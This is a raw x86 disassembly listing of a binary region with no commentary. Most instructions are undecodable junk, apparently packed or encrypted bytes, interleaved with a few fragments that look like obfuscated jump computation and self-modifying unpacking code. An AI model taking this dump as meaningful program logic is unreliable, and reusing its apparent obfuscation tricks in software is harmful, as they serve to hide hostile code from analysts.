  40292f:	scas   al,BYTE PTR es:[edi]
  402930:	xor    al,0xbb
  402932:	add    esi,esi
  402934:	xchg   edx,eax
  402935:	sbb    bh,BYTE PTR [esi]
  402937:	pop    eax
  402938:	push   ebx
  402939:	enter  0x5d78,0xe4
  40293d:	shl    DWORD PTR [edi-0xb8b749c],1
  402943:	repnz add al,0x6a
  402946:	call   0x46bf:0x838a61c4
  40294d:	xor    eax,0x3cf1c82c
  402952:	push   ebx
  402953:	loope  0x4028e8
  402955:	mov    cl,0x40
  402957:	repnz push ss
  402959:	jb     0x4029a5
  40295b:	sti    
  40295c:	fidiv  DWORD PTR cs:[ebp+0xe]
  402960:	pushf  
  402961:	shl    DWORD PTR [edx-0x33],cl
  402964:	sub    al,BYTE PTR [edi-0x636fb7f6]
  40296a:	outs   dx,BYTE PTR ds:[esi]
  40296b:	es leave 
  40296d:	sub    bh,BYTE PTR [edx-0x1a4b4d9b]
  402973:	(bad)  
  402974:	pop    edx
  402975:	push   ebx
  402976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402977:	stos   DWORD PTR es:[edi],eax
  402978:	loopne 0x4029cb
  40297a:	lods   eax,DWORD PTR ds:[esi]
  40297b:	mov    ds:0x1f85dcc7,eax
  402980:	out    dx,eax
  402981:	lock cwde 
  402983:	bound  ebp,QWORD PTR [ecx]
  402985:	cld    
  402986:	not    DWORD PTR [eax+0x40]
  402989:	sub    eax,0x1aab4011
  40298e:	add    al,0xf6
  402990:	xor    dl,BYTE PTR [edx-0x73]
  402993:	mov    WORD PTR [edx-0x5098a187],fs
  402999:	lods   eax,DWORD PTR ds:[esi]
  40299a:	ins    DWORD PTR es:[edi],dx
  40299b:	and    BYTE PTR [esi],0x98
  40299e:	pusha  
  40299f:	cdq    
  4029a0:	je     0x402952
  4029a2:	or     BYTE PTR [esi+ecx*2-0x742baedc],dh
  4029a9:	sbb    ebx,DWORD PTR [edi+0xb]
  4029ac:	inc    ecx
  4029ad:	lods   al,BYTE PTR ds:[esi]
  4029ae:	push   ecx
  4029af:	add    ebx,DWORD PTR [esi+0x72]
  4029b2:	(bad)  
  4029b3:	push   eax
  4029b4:	(bad)  
  4029b5:	fidiv  WORD PTR [esi+0x1a28efc0]
  4029bb:	loop   0x402a1d
  4029bd:	jmp    0x4029d6
  4029bf:	pop    eax
  4029c0:	xchg   ecx,eax
  4029c1:	call   0xdbf58f5e
  4029c6:	(bad)  
  4029c7:	mov    esi,0xbfd187ba
  4029cc:	sbb    al,0x4d
  4029ce:	(bad)  
  4029d1:	shl    DWORD PTR [eax-0xc36b61d],cl
  4029d7:	mov    ebp,0x2e42d0f3
  4029dc:	data16 and ch,BYTE PTR [esp+0x62b991fd]
  4029e4:	inc    esi
  4029e5:	test   al,0xf9
  4029e7:	arpl   WORD PTR [ebx+0x751f48ad],ax
  4029ed:	shr    BYTE PTR [edx+0x75e87990],0xf5
  4029f4:	push   esp
  4029f5:	cmp    ah,BYTE PTR [edi]
  4029f7:	mov    al,ds:0x42f63de
  4029fc:	rcr    DWORD PTR [edx-0x66],1
  4029ff:	xchg   esp,eax
  402a00:	push   esp
  402a01:	aam    0xeb
  402a03:	retf   
  402a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a05:	cmp    BYTE PTR [eax-0x1334b22a],ah
  402a0b:	dec    ecx
  402a0c:	stc    
  402a0d:	push   edi
  402a0e:	das    
  402a0f:	mov    dl,0xa8
  402a11:	mov    dl,0x7e
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	sbb    al,0xa2
  402a36:	push   esp
  402a37:	pop    eax
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	xor    dh,BYTE PTR [eax+0x16]
  402a43:	cli    
  402a44:	out    dx,eax
  402a45:	mov    al,0x70
  402a47:	adc    BYTE PTR [esi],al
  402a49:	mov    esp,0x8ef9a991
  402a4e:	xchg   BYTE PTR [ebx-0x18052a16],dl
  402a54:	nop
  402a55:	xchg   esi,eax
  402a56:	jecxz  0x402a8b
  402a58:	sub    al,0xfd
  402a5a:	inc    esp
  402a5b:	test   BYTE PTR [edx],al
  402a5d:	into   
  402a5e:	and    DWORD PTR [eax-0x32],0xffffffcf
  402a62:	pop    esi
  402a63:	pop    esp
  402a64:	add    esi,ecx
  402a66:	jb     0x402a83
  402a68:	(bad)  
  402a69:	in     al,dx
  402a6a:	das    
  402a6b:	adc    DWORD PTR [esp+esi*4-0x303ba209],ebx
  402a72:	push   esi
  402a73:	aaa    
  402a74:	or     eax,0xc6fa689e
  402a79:	push   ss
  402a7a:	push   edx
  402a7b:	push   ds
  402a7c:	outs   dx,DWORD PTR ds:[esi]
  402a7d:	inc    ebp
  402a7e:	fmul   QWORD PTR [eax+0x50]
  402a81:	ins    BYTE PTR es:[edi],dx
  402a82:	add    eax,0xae32b6d8
  402a87:	call   0xa91:0x2f111ed7
  402a8e:	out    0x48,al
  402a90:	mov    eax,0xe44a1f9c
  402a95:	and    eax,0x23a2634c
  402a9a:	dec    edx
  402a9b:	in     eax,dx
  402a9c:	lods   al,BYTE PTR ds:[esi]
  402a9d:	lods   eax,DWORD PTR ds:[esi]
  402a9e:	jmp    0x402aca
  402aa0:	jp     0x8ec37978
  402aa6:	bound  edx,QWORD PTR [ebp-0x6b]
  402aa9:	pop    ss
  402aaa:	bound  esp,QWORD PTR [ebx+0x62]
  402aad:	cmp    DWORD PTR [esi+0x4b6a82f2],0x2f7c6060
  402ab7:	inc    ebp
  402ab8:	mov    WORD PTR [eax],gs
  402aba:	jbe    0x402a4d
  402abc:	cmp    bh,BYTE PTR gs:[esi]
  402abf:	arpl   WORD PTR [ebp+0x40fa5051],dx
  402ac5:	push   0x4f20ed1b
  402aca:	xchg   edx,eax
  402acb:	mov    al,BYTE PTR [ebp-0x9691095]
  402ad1:	repz mov cl,0x4f
  402ad4:	mov    dh,0x9d
  402ad6:	repz mov al,ds:0xbd4b2325
  402adc:	dec    esi
  402add:	bound  edx,QWORD PTR [ecx]
  402adf:	jecxz  0x402b3a
  402ae1:	pushf  
  402ae2:	cmc    
  402ae3:	mov    eax,0xe740fae0
  402ae8:	cld    
  402ae9:	sub    ebp,DWORD PTR [eax+0x7c18b65]
  402aef:	shl    DWORD PTR [esi-0x72],cl
  402af2:	xchg   BYTE PTR [ebp-0x2c],al
  402af5:	push   0xf6feafb2
  402afa:	jge    0x402ac6
  402afc:	mov    cl,0xf6
  402afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aff:	in     eax,0xb8
  402b01:	or     BYTE PTR [edx-0x52],ch
  402b04:	pop    ecx
  402b05:	imul   DWORD PTR ds:0xd14f6dde
  402b0b:	mov    ecx,0x39596573
  402b10:	dec    ecx
  402b11:	int    0xb4
  402b13:	gs mov al,0x8c
  402b16:	adc    DWORD PTR [edi-0x7c8ccedb],edi
  402b1c:	pop    edx
  402b1d:	(bad)  
  402b1e:	in     eax,dx
  402b1f:	arpl   WORD PTR [ebx-0x7b],dx
  402b22:	cmp    DWORD PTR [edx],0xffffff82
  402b25:	pop    ebp
  402b26:	xchg   edx,eax
  402b27:	cmp    dl,0xb4
  402b2a:	xchg   edi,eax
  402b2b:	ds pop esp
  402b2d:	imul   edi,ebp,0x7b0c0a09
  402b33:	in     eax,0x17
  402b35:	inc    ebx
  402b36:	sub    ebp,edx
  402b38:	lods   eax,DWORD PTR ds:[esi]
  402b39:	jmp    0x124baad3
  402b3e:	xchg   BYTE PTR [ebx-0x5c],al
  402b41:	sub    al,0x69
  402b43:	pushf  
  402b44:	sbb    DWORD PTR [esi+ebx*8+0x41],ebp
  402b48:	sub    ecx,DWORD PTR [ebx-0x4b49a5c7]
  402b4e:	mov    eax,0xe68e88e6
  402b53:	loop   0x402b02
  402b55:	push   esp
  402b56:	mov    ds:0x2f1bffb7,al
  402b5b:	dec    esp
  402b5c:	xor    bl,cl
  402b5e:	push   ss
  402b5f:	xlat   BYTE PTR ds:[ebx]
  402b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b61:	adc    eax,0x4e2ed5e2
  402b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b67:	or     al,BYTE PTR [eax+esi*2]
  402b6a:	xor    bl,BYTE PTR [ebp+0x5784453a]
  402b70:	enter  0xf655,0xa2
  402b74:	mov    edx,0xf0a980be
  402b79:	shr    DWORD PTR [ebx+0x25966b04],cl
  402b7f:	(bad)  
  402b80:	mov    eax,ds:0x1f96f8e4
  402b85:	cld    
  402b86:	inc    esi
  402b87:	(bad)  
  402b88:	das    
  402b89:	int3   
  402b8a:	pop    ebp
  402b8b:	jbe    0x402be5
  402b8d:	adc    DWORD PTR ds:0x4b8a1e58,edx
  402b93:	imul   eax,esp,0x90dac5bb
  402b99:	add    al,0xfa
  402b9b:	fidivr WORD PTR [eax+0x32]
  402b9e:	jmp    0x402b7c
  402ba0:	(bad)  
  402ba2:	sub    BYTE PTR [ecx-0x34],dh
  402ba5:	scas   eax,DWORD PTR es:[edi]
  402ba6:	and    ebx,DWORD PTR [ebx+0x5d]
  402ba9:	arpl   WORD PTR [edi+0x34],dx
  402bac:	retf   0x2823
  402baf:	je     0x402c2f
  402bb1:	fldpi  
  402bb3:	xor    ecx,DWORD PTR [ebx-0x14ee89d3]
  402bb9:	iret   
  402bba:	xchg   edi,eax
  402bbb:	fsub   QWORD PTR [edx]
  402bbd:	jb     0xf29d6330
  402bc3:	and    al,BYTE PTR [ebp+0x28840fc0]
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	adc    BYTE PTR [esp+ecx*4+0x7e0b3682],dh
  402c18:	jle    0x402c14
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bf8
  402c1e:	jne    0x402c5e
  402c20:	fsubr  QWORD PTR [esi+0x7c04e8c3]
  402c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c27:	pusha  
  402c28:	lods   al,BYTE PTR ds:[esi]
  402c29:	adc    eax,0x78ef100c
  402c2e:	mov    dh,0x4a
  402c30:	(bad)  
  402c31:	mov    bl,0xf9
  402c33:	ss or  bl,ch
  402c36:	jnp    0x402be3
  402c38:	push   ds
  402c39:	lods   al,BYTE PTR ds:[esi]
  402c3a:	mov    cl,0x94
  402c3c:	and    dl,BYTE PTR [esi]
  402c3e:	xchg   edi,eax
  402c3f:	mov    WORD PTR [ecx],cs
  402c41:	cwde   
  402c42:	mov    ds:0xe9b96996,al
  402c47:	pop    esp
  402c48:	(bad)  
  402c4a:	jmp    0x2a6f:0x35ee7e02
  402c51:	sub    DWORD PTR [eax],0xffffffe6
  402c54:	out    dx,al
  402c55:	loopne 0x402cab
  402c57:	test   DWORD PTR [esi+0x77],ebp
  402c5a:	arpl   WORD PTR [eax-0x20],bx
  402c5d:	xchg   esp,eax
  402c5e:	into   
  402c5f:	jb     0x402c31
  402c61:	or     ah,dl
  402c63:	add    ebp,esp
  402c65:	jb     0x402cd4
  402c67:	mov    esp,0xc95b37fd
  402c6c:	sbb    BYTE PTR [ebp-0x1f63d7ad],dl
  402c72:	sub    DWORD PTR ds:0x70b85f8a,esi
  402c78:	dec    ebp
  402c79:	aas    
  402c7a:	xor    bl,BYTE PTR [edi+0x54ca8da6]
  402c80:	sub    BYTE PTR [eax*4-0x5ffc74aa],al
  402c87:	dec    esp
  402c88:	xchg   ebp,eax
  402c89:	dec    ebx
  402c8a:	je     0x402cf8
  402c8c:	mov    ebp,0x939c7d5e
  402c91:	arpl   WORD PTR [ebp+0x6cdbb16f],bp
  402c97:	xor    BYTE PTR [ebp+edx*2+0x1a],al
  402c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c9c:	aas    
  402c9d:	scas   al,BYTE PTR es:[edi]
  402c9e:	mov    esp,0x213a1d93
  402ca3:	retf   0x94ee
  402ca6:	or     esi,DWORD PTR [edi]
  402ca8:	mov    WORD PTR [ecx+edx*1-0x10],?
  402cac:	sub    BYTE PTR [edi+0x7ee8791a],dh
  402cb2:	hlt    
  402cb3:	xor    eax,DWORD PTR [ecx+0x3b]
  402cb6:	stc    
  402cb7:	scas   eax,DWORD PTR es:[edi]
  402cb8:	aaa    
  402cb9:	dec    eax
  402cba:	inc    ecx
  402cbb:	sub    DWORD PTR [edi-0x5dfeaea6],edi
  402cc1:	popa   
  402cc2:	xlat   BYTE PTR ds:[ebx]
  402cc3:	sbb    al,0xdb
  402cc5:	xchg   ebp,eax
  402cc6:	mov    eax,ds:0x94daf9fd
  402ccb:	loop   0x402c9b
  402ccd:	and    ecx,DWORD PTR [edi]
  402ccf:	mov    esp,0x6fabe20
  402cd4:	mov    dh,0xff
  402cd6:	fmulp  st(2),st
  402cd8:	scas   eax,DWORD PTR es:[edi]
  402cd9:	loope  0x402c91
  402cdb:	inc    ebp
  402cdc:	and    DWORD PTR [eax+ebx*1-0x6e],edi
  402ce0:	ss inc esp
  402ce2:	lea    edi,[esi-0x70]
  402ce5:	aas    
  402ce6:	xchg   edx,eax
  402ce7:	xchg   esp,eax
  402ce8:	popa   
  402ce9:	add    ebp,DWORD PTR [esi+esi*4+0x7c]
  402ced:	sub    DWORD PTR [edx-0x392a4cb3],0x63
  402cf4:	les    ebp,FWORD PTR [edi+0x14cd2ce8]
  402cfa:	jae    0x402d36
  402cfc:	shr    BYTE PTR [edi],1
  402cfe:	dec    ecx
  402cff:	fcmovb st,st(1)
  402d01:	cmp    bh,BYTE PTR ds:0xf98455b4
  402d07:	mov    ah,0x6b
  402d09:	xlat   BYTE PTR ds:[ebx]
  402d0a:	push   ecx
  402d0b:	pop    esp
  402d0c:	mov    dl,0x89
  402d0e:	mov    edi,0xbcd93ab3
  402d13:	push   es
  402d14:	ret    0xa51c
  402d17:	outs   dx,BYTE PTR ds:[esi]
  402d18:	fist   DWORD PTR [ebp-0x71]
  402d1b:	jmp    0x402cdf
  402d1d:	enter  0x5d96,0x99
  402d21:	jp     0x402caa
  402d23:	std    
  402d24:	cli    
  402d25:	mov    ch,0x59
  402d27:	cmp    al,0x19
  402d29:	mov    al,0xce
  402d2b:	push   esi
  402d2c:	sbb    esi,DWORD PTR [ebp+0x30]
  402d2f:	xchg   edx,eax
  402d30:	mov    ah,0x4b
  402d32:	les    edx,FWORD PTR [edi]
  402d34:	imul   esp,DWORD PTR [esi],0x3f
  402d37:	push   eax
  402d38:	and    DWORD PTR [ecx],ecx
  402d3a:	sbb    DWORD PTR [edi-0x53949ea0],edi
  402d40:	loope  0x402d95
  402d42:	adc    DWORD PTR [esi],ecx
  402d44:	xchg   esi,eax
  402d45:	sub    ecx,ebp
  402d47:	test   DWORD PTR [edx],eax
  402d49:	call   0x6030:0x58320e2c
  402d50:	or     bh,0xae
  402d53:	cmp    eax,0xe5dc298a
  402d58:	outs   dx,BYTE PTR ds:[esi]
  402d59:	aas    
  402d5a:	test   al,0x4a
  402d5c:	cmp    al,0x5
  402d5e:	sub    BYTE PTR [ecx],al
  402d60:	push   es
  402d61:	in     al,dx
  402d62:	adc    ecx,esi
  402d64:	mov    cl,0x25
  402d66:	cdq    
  402d67:	std    
  402d68:	push   esp
  402d69:	xchg   ebx,eax
  402d6a:	xchg   ebx,eax
  402d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d6c:	pop    edx
  402d6d:	xor    bh,BYTE PTR [ebx+0x16]
  402d70:	imul   BYTE PTR [ebp*2+0xb27c4ef]
  402d77:	mov    esp,0xc3a8ce29
  402d7c:	test   eax,0x2ed953e0
  402d81:	ja     0x402d76
  402d83:	ja     0x402d99
  402d85:	dec    edx
  402d86:	pop    ds
  402d87:	inc    edx
  402d88:	push   cs
  402d89:	cmp    al,0x62
  402d8b:	scas   al,BYTE PTR es:[edi]
  402d8c:	test   eax,0xfc6ecdd8
  402d91:	mov    ch,0x5c
  402d93:	ret    0x10f7
  402d96:	call   0xf9fb8087
  402d9b:	aas    
  402d9c:	in     eax,dx
  402d9d:	xor    al,0x28
  402d9f:	es jne 0x402dcd
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebp+edi*4+0x70],1
  402de7:	push   cs
  402de8:	mov    dh,0xb2
  402dea:	or     BYTE PTR [esi+0x7e],bh
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e2d
  402df2:	push   0x20
  402df4:	out    dx,al
  402df5:	mov    cl,0x35
  402df7:	adc    DWORD PTR [ebx],edx
  402df9:	jle    0x402deb
  402dfb:	cwde   
  402dfc:	inc    edi
  402dfd:	sub    dh,dl
  402dff:	repz test BYTE PTR fs:[edx],bl
  402e03:	pushf  
  402e04:	lds    esp,FWORD PTR [eax]
  402e06:	cmp    cl,BYTE PTR [ebx]
  402e08:	ds fs lock push edi
  402e0c:	sar    DWORD PTR [edi+0xbc21cc8],1
  402e12:	lahf   
  402e13:	mov    DWORD PTR [eax-0x77efa438],0x5126b428
  402e1d:	mov    dh,0xf9
  402e1f:	jne    0x402e4b
  402e21:	adc    DWORD PTR ds:0xb9aadc75,edi
  402e27:	xor    esi,DWORD PTR [esi-0x29]
  402e2a:	hlt    
  402e2b:	data16 loope 0x402e9e
  402e2e:	repnz aas 
  402e30:	and    DWORD PTR [eax+0x13bf769d],ebx
  402e36:	sub    eax,0x6703a93
  402e3b:	retf   0x9c28
  402e3e:	push   ebp
  402e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e40:	push   es
  402e41:	jle    0x402e03
  402e43:	mov    DWORD PTR [esi+0x77e987d5],ecx
  402e49:	(bad)
  402e4d:	js     0x402e53
  402e4f:	dec    ebx
  402e50:	lods   al,BYTE PTR ds:[esi]
  402e51:	dec    ecx
  402e52:	sbb    BYTE PTR [ecx+0x5d],0xd
  402e56:	cmp    esi,ebp
  402e58:	or     BYTE PTR [eax],0xed
  402e5b:	aad    0xa
  402e5d:	jp     0x402e40
  402e5f:	aaa    
  402e60:	mov    ?,edi
  402e62:	push   esi
  402e63:	shr    DWORD PTR [edi],cl
  402e65:	(bad)  [ebx-0x53]
  402e68:	(bad)  
  402e69:	xchg   esi,eax
  402e6a:	fdivr  QWORD PTR [ebp-0x1a6d57e7]
  402e70:	in     eax,0x4b
  402e72:	push   ss
  402e73:	sti    
  402e74:	jnp    0x402e9e
  402e76:	fwait
  402e77:	leave  
  402e78:	rol    BYTE PTR [ebx-0x30a2ad20],0x8c
  402e7f:	mov    dh,0xfd
  402e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e82:	push   esi
  402e83:	pop    edx
  402e84:	jg     0x402e2e
  402e86:	stos   DWORD PTR es:[edi],eax
  402e87:	pop    ds
  402e88:	(bad)  
  402e89:	(bad)  
  402e8a:	jno    0x402e25
  402e8c:	std    
  402e8d:	ror    ebx,cl
  402e8f:	(bad)  
  402e90:	mov    dl,0x36
  402e92:	rcr    DWORD PTR [eax-0x5a6019ba],0x46
  402e99:	repnz shl DWORD PTR [ecx],0x6
  402e9d:	pop    ecx
  402e9e:	adc    ebp,edi
  402ea0:	and    DWORD PTR [eax-0x4d2a22c2],0xea3e9d55
  402eaa:	inc    esp
  402eab:	jb     0x402ed4
  402ead:	mov    ch,0xe2
  402eaf:	dec    ecx
  402eb0:	push   ecx
  402eb1:	pop    ebx
  402eb2:	and    eax,0x37537e5a
  402eb7:	iret   
  402eb8:	inc    edi
  402eb9:	js     0x402f32
  402ebb:	rcl    DWORD PTR [eax+ecx*2],1
  402ebe:	jmp    0x6b9588fe
  402ec3:	jns    0x402ed7
  402ec5:	cmp    eax,0xe33ce005
  402eca:	dec    ecx
  402ecb:	loop   0x402e81
  402ecd:	push   ds
  402ece:	xchg   edx,eax
  402ecf:	xchg   ebx,eax
  402ed0:	test   BYTE PTR [edi-0x1a],cl
  402ed3:	dec    esi
  402ed4:	cwde   
  402ed5:	lock cmp eax,0xd491c661
  402edb:	loopne 0x402ebf
  402edd:	ds cwde 
  402edf:	in     al,dx
  402ee0:	mov    bl,BYTE PTR [esi+0xe7309aa]
  402ee6:	or     al,0xd
  402ee8:	jl     0x402f4b
  402eea:	test   DWORD PTR [ebx+0x11],0x372dce42
  402ef1:	rcr    BYTE PTR [edx-0xe],0x5a
  402ef5:	xor    bh,BYTE PTR [eax-0x201336bc]
  402efb:	adc    bh,ah
  402efd:	mov    ah,dl
  402eff:	add    al,0xc8
  402f01:	(bad)  
  402f03:	mov    al,ds:0x978d9eff
  402f08:	jno    0x402f88
  402f0a:	iret   
  402f0b:	push   esi
  402f0c:	xchg   ecx,eax
  402f0d:	and    al,0x79
  402f0f:	out    0xf6,al
  402f11:	add    ecx,DWORD PTR [esi+0x1df8f264]
  402f17:	arpl   WORD PTR [esi],bx
  402f19:	and    DWORD PTR [ebx+edi*4],0xe09a8fc7
  402f20:	sub    al,0xa2
  402f22:	not    BYTE PTR [eax-0x10]
  402f25:	into   
  402f26:	jp     0x402f2c
  402f28:	repz mov ds:0x8a4b6585,eax
  402f2e:	jo     0x402f6e
  402f30:	addr16 loope 0x402ef1
  402f33:	fnsave [edi]
  402f35:	mov    ds:0x3f72fc55,al
  402f3a:	pop    esp
  402f3b:	ret    0x56c5
  402f3e:	sti    
  402f3f:	sub    ecx,DWORD PTR [edx+0x0]
  402f42:	jmp    0xa98d:0x7671873b
  402f49:	aaa    
  402f4a:	rol    BYTE PTR [eax],cl
  402f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f4d:	xchg   edi,eax
  402f4e:	(bad)  
  402f4f:	jge    0x402f87
  402f51:	int3   
  402f52:	lds    ebp,FWORD PTR ds:0x83b8bb12
  402f58:	rcl    DWORD PTR [ecx+0x36],0xa9
  402f5c:	cmp    eax,0xfdae6236
  402f61:	adc    BYTE PTR [ebp+0x4145dc2d],ah
  402f67:	nop
  402f68:	ja     0x402f68
  402f6a:	fidiv  WORD PTR [eax-0x51]
  402f6d:	stos   BYTE PTR es:[edi],al
  402f6e:	xor    BYTE PTR [edx+ecx*1],dh
  402f71:	jmp    0x8d9d9526
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x54895a49]
  402fae:	sbb    ecx,DWORD PTR [edx+0x3e]
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f5e
  402fb9:	or     al,0x39
  402fbb:	dec    ebx
  402fbc:	pop    es
  402fbd:	pop    edi
  402fbe:	push   esi
  402fbf:	pop    ebx
  402fc0:	cmp    DWORD PTR [esi+0x21606d1a],esp
  402fc6:	inc    ebp
  402fc7:	enter  0x7911,0x7b
  402fcb:	(bad)  
  402fcc:	xchg   ecx,eax
  402fcd:	or     BYTE PTR [edi-0x7f224f7e],dl
  402fd3:	mov    eax,ds:0x5cd16420
  402fd8:	imul   eax,DWORD PTR [eax+0x63b56433],0xcf643854
  402fe2:	mov    ch,0x96
  402fe4:	icebp  
  402fe5:	jecxz  0x402f98
  402fe7:	inc    ebp
  402fe8:	mov    dl,0xec
  402fea:	loopne 0x403014
  402fec:	mov    ah,0xfd
  402fee:	and    al,0x3d
  402ff0:	jp     0x402fd9
  402ff2:	dec    edi
  402ff3:	dec    ebp
  402ff4:	and    al,0x4
  402ff6:	ror    BYTE PTR [esi-0x5c],cl
  402ff9:	rcl    BYTE PTR [ecx+eax*1],0xe
  402ffd:	sbb    DWORD PTR [ebx+esi*1],ebp
  403000:	and    dl,dh
  403002:	mov    dh,0x9b
  403004:	ds das 
  403006:	fild   DWORD PTR [ebp-0x40]
  403009:	push   esi
  40300a:	fld    QWORD PTR [esi+0x28d0b4e8]
  403010:	cmp    BYTE PTR [ebp-0xe5ee472],ah
  403016:	push   esi
  403017:	jnp    0x402fbc
  403019:	cmp    BYTE PTR [esi+0x685e8351],dl
  40301f:	cmc    
  403020:	loope  0x403055
  403022:	lea    edi,[edx-0x49]
  403025:	inc    edx
  403026:	jge    0x40308e
  403028:	mov    esi,0xe8dfbad1
  40302d:	mov    eax,ds:0x32a9e058
  403032:	loopne 0x403029
  403034:	pop    edx
  403035:	icebp  
  403036:	dec    ebp
  403037:	xchg   ecx,eax
  403038:	push   ss
  403039:	mov    eax,0xaf56fe82
  40303e:	dec    edx
  40303f:	(bad)  
  403040:	pop    edi
  403041:	ins    DWORD PTR es:[edi],dx
  403042:	inc    ecx
  403043:	scas   eax,DWORD PTR es:[edi]
  403044:	or     ebx,DWORD PTR [edx-0x4ef8d645]
  40304a:	fld    DWORD PTR [edi+0x15]
  40304d:	ret    
  40304e:	xor    ecx,esi
  403050:	pop    ecx
  403051:	fmul   QWORD PTR [esi]
  403053:	daa    
  403054:	push   es
  403055:	in     al,dx
  403056:	sub    ebp,DWORD PTR [ecx]
  403058:	test   BYTE PTR [edx-0x4cbc9665],bl
  40305e:	dec    ebp
  40305f:	mov    ebx,0x8f072819
  403064:	gs mov edi,0xec1a5560
  40306a:	dec    edi
  40306b:	add    edx,DWORD PTR [edx]
  40306d:	test   eax,0x2e7a1a70
  403072:	add    al,0xab
  403074:	rcl    bh,cl
  403076:	mov    eax,ds:0xf2e60c7f
  40307b:	jecxz  0x40301d
  40307d:	daa    
  40307e:	and    DWORD PTR [ebx+ebp*4-0x4c],ebx
  403082:	pop    esi
  403083:	div    esp
  403085:	cmp    BYTE PTR [esi+eiz*2+0x1b],ah
  403089:	mov    esp,0x8338bd75
  40308e:	mov    esi,DWORD PTR [ebp-0x1dfa8d0f]
  403094:	mov    WORD PTR ds:0x84498e48,gs
  40309a:	sub    DWORD PTR [edi-0x7b],edx
  40309d:	push   ebp
  40309e:	xor    DWORD PTR [ebx],ebx
  4030a0:	outs   dx,BYTE PTR ds:[esi]
  4030a1:	jno    0x403057
  4030a3:	add    BYTE PTR [esi-0x2b],dh
  4030a6:	dec    edx
  4030a7:	popf   
  4030a8:	shl    ch,0xff
  4030ab:	mov    edx,0xa294c2fe
  4030b0:	aam    0x99
  4030b2:	sti    
  4030b3:	into   
  4030b4:	hlt    
  4030b5:	nop
  4030b6:	sub    esi,DWORD PTR [eax+0x34033275]
  4030bc:	mov    ebp,0xaa5938cf
  4030c1:	xchg   edx,eax
  4030c2:	sub    esi,edi
  4030c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030c5:	mov    BYTE PTR [eax],ch
  4030c7:	ds ds xor bl,ah
  4030cb:	xor    BYTE PTR [eax],0x24
  4030ce:	div    ebp
  4030d0:	add    eax,0xca254f32
  4030d5:	dec    edi
  4030d6:	sub    ah,BYTE PTR [ecx-0x2a]
  4030d9:	fsubr  st(7),st
